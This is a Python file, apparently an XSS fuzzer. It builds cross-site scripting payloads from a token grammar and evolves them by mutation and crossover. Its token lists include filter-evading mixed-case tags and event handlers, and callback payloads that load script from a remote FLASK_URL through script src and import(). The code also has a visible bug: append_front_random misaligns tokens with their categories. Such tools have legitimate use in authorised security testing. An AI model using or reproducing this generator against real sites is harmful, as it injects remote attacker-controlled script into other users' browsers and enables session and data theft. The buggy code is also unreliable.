import random
from config import *

CALLBACK_URLs = [
    f'"{FLASK_URL}"',
    f"'{FLASK_URL}'",
    f"`{FLASK_URL}`"
]

CALLBACKs = [
    f'import("{FLASK_URL}")',
    f"import('{FLASK_URL}')",
    f"import(`{FLASK_URL}`)"
]

xssTokens = {
    "inline" : [
        "jAvAsCriPt:"
    ],
    "trigger_exploits": [
        CALLBACKs[0],
        CALLBACKs[1],
        CALLBACKs[2]
    ],
    "exploits": [
        f"<ScRiPt sRc={CALLBACK_URLs[0]}></ScRiPt>",
        f"<ScRiPt sRc={CALLBACK_URLs[1]}></ScRiPt>",
        f"<ScRiPt sRc={CALLBACK_URLs[2]}></ScRiPt>",
    ],
    "literal_tokens": [
        " ",
        ';',
        ',',
        '\'',
        '/',
        '<!--',
        '-->',
        '--!>',
        '(',
        ')',
        '/*',
        "-",
        "`",
        "'",
        '"',
        "*",
        '*/',
        '\x20', # | |
        '\x27',  # |'|
     ],
    "open": [
        '<',
        '&lt;',
        '\x3c',
    ],
    "pre_token": [
        '/',
    ],
    "html_tokens": [
        'sCrIpT',
        'iMg',
        'sVg',
    ],
    "trigger_tokens": [
        ' oNLoAd=',
        ' oNeRrOr=',
        ' onClICk=',
        ' oNFoCus=',
        ' OnBlUr=',
        ' oNtOgGle=',
        ' oNmOuSeLeaVe=',
        ' oNmOuSeOveR=',
    ],
    "html_break_only_tokens": [
        'a',
        'bUtTon',
        'iNpUt',
        'frAmEsEt',
        'teMplAte',
        'auDio',
        'viDeO',
        'sOurCe',
        'hTmL',
        'nOeMbed',
        'noScRIpt',
        'StYle',
        'ifRaMe',
        'xMp',
        'texTarEa',
        'nOfRaMeS',
        'tITle',
    ],
    "pre_close": [
        '/',
    ],
    "close": [
        '&gt;',
        '>',
        '\x3e'
    ]
}

TOKEN_CATEGORIES = list(xssTokens.keys())

grammar = {
    "inline": ["inline", "trigger_exploits", "literal_tokens"],
    "open": ["html_tokens", "pre_token"],
    "pre_token": ["html_tokens", "html_break_only_tokens"],
    "html_tokens": ["literal_tokens", "trigger_tokens"],
    "html_break_only_tokens": ["close"],
    "pre_close": ["close"],
    "close": TOKEN_CATEGORIES,

    "exploits": TOKEN_CATEGORIES,
    #"html_breaker": TOKEN_CATEGORIES,
    "literal_tokens": TOKEN_CATEGORIES,
    #"pre_trigger_token": ["trigger_tokens"],
    "trigger_tokens": ["trigger_exploits", "literal_tokens"],
    "trigger_exploits": ["trigger_tokens", "pre_close", "close", "literal_tokens"]
}

reversed_grammar = {t: [t2 for t2 in TOKEN_CATEGORIES if t in grammar[t2]] for t in TOKEN_CATEGORIES}

class Payload:
    tokens = []
    token_categories = []
    score = 0
    effectivity = 0

    def __init__(self):
        self.token_categories = [random.choice(TOKEN_CATEGORIES)]
        self.tokens = [random.choice(xssTokens[self.token_categories[-1]])]

    def copy(self):
        _copy = Payload()
        _copy.tokens = self.tokens.copy()
        _copy.token_categories = self.token_categories.copy()
        return _copy

    def __len__(self):
        return len(self.tokens)

    def random_append_one(self):
        self.token_categories.append(random.choice(TOKEN_CATEGORIES))
        self.tokens.append(random.choice(xssTokens[self.token_categories[-1]]))

    def grammar_expand(self):
        self.token_categories.append(random.choice(grammar[self.token_categories[-1]]))
        self.tokens.append(random.choice(xssTokens[self.token_categories[-1]]))

    def __str__(self):
        string = ""
        for token in self.tokens:
            string += token
        return string

    def append_random(self):
        for _ in range(random.randint(1, 10)):
            self.grammar_expand()

    def append_front_random(self):
        for _ in range(random.randint(1, 10)):
            self.token_categories.insert(0, random.choice(reversed_grammar[self.token_categories[0]]))
            self.tokens.append(random.choice(xssTokens[self.token_categories[0]]))

    def mutate(self):
        choice = random.choice([0, 1, 2, 3])
        if choice == 0:
            for _ in range(random.randint(0, len(self.tokens) // 2)):
                self.tokens.pop(0)
                self.token_categories.pop(0)
            self.append_random()
        if choice == 1:
            for _ in range(random.randint(0, len(self.tokens) // 2)):
                self.tokens.pop()
                self.token_categories.pop()
            self.append_front_random()
        if choice == 2:
            for _ in range(random.randint(0, len(self.tokens) // 2)):
                self.tokens.pop()
                self.token_categories.pop()
            self.append_random()
        if choice == 3:
            for _ in range(random.randint(0, len(self.tokens) // 2)):
                self.tokens.pop(0)
                self.token_categories.pop(0)
            self.append_front_random()

def cross_payloads(payload_1, payload_2):
    i_1 = random.randint(1, len(payload_1))
    i_2 = random.randint(1, len(payload_2))
    tokens = payload_1.tokens[:i_1] + payload_2.tokens[i_2:]
    token_categories = payload_1.token_categories[:i_1] + payload_2.token_categories[i_2:]
    child = Payload()
    child.tokens = tokens
    child.token_categories = token_categories
    return child

def generate_payload(use_grammar:bool = True, length: int = None):
    if length is None:
        length = random.randint(1, 20)
    payload = Payload()
    for _ in range(1, length):
        if use_grammar:
            payload.grammar_expand()
        else:
            payload.random_append_one()
    return payload


if __name__ == "__main__":
    p = generate_payload()
    p2 = generate_payload()
    print("p" , str(p))
    print("p2" , str(p2))
    for i in range(10):
        cr = cross_payloads(p, p2)
        print(str(cr))